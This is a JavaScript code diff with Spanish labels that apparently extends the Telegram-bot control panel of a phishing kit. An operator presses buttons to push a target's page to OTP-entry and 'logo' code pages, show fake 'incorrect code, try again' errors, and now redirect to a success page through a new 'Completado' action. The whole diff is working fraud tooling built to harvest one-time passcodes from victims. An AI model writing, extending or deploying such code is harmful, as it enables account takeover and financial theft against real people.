@@ -35,6 +35,9 @@ function getKeyboard(tid) {
         [
             { text: '🪪 Pedir Logo', callback_data: `logo|${tid}`       },
             { text: '❌ Error Logo', callback_data: `error_logo|${tid}` }
+        ],
+        [
+            { text: '✅ Completado', callback_data: `completado|${tid}` }
         ]
     ];
 }
@@ -84,7 +87,8 @@ const ACTION_MAP = {
     otp:        { url: './otp-check.html' },
     error_otp:  { url: './otp-check.html',  showError: true, errorMessage: '⚠️ Código OTP incorrecto, intenta nuevamente' },
     logo:       { url: './logo-check.html' },
-    error_logo: { url: './logo-check.html', showError: true, errorMessage: '⚠️ Código inválido, intenta nuevamente' }
+    error_logo: { url: './logo-check.html', showError: true, errorMessage: '⚠️ Código inválido, intenta nuevamente' },
+    completado: { url: './exitoso.html' }
 };
 
 // Nombre legible de cada acción para el mensaje de confirmación
@@ -93,6 +97,7 @@ const ACTION_LABELS = {
     error_otp:  '❌ Error OTP',
     logo:       '🪪 Pedir Logo',
     error_logo: '❌ Error Logo',
+    completado: '✅ Completado',
 };
 
 // ── Manejar presión de botón ──────────────────────────────────────────────────
